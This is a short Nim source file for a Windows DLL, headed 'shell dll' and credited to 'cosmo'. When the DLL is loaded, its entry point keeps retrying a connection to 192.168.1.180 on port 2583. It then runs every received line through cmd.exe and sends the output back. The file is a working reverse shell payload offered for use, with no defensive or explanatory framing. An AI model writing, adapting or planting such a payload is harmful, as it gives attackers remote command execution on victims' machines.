# shell dll
# created by : cosmo

# imports
import winim/lean
import net, osproc, strformat

proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
    NimMain()

    if fdwReason == DLL_PROCESS_ATTACH:

        # variables
        let
            ip = "192.168.1.180"
            port = 2583
            sock = newSocket()
            prompt = "Cosmo's Shell $ "

        # connection
        while true:
            try:
                sock.connect(ip, Port(port))
            except:
                continue

            break
        
        # loop remote shell
        while true:
            send(sock, prompt)
            let args = recvLine(sock)

            # execute
            try:
                let cmd = execProcess(fmt"cmd.exe /c" & args)
                send(sock, cmd)

            # disconnect
            except:
                break

    return true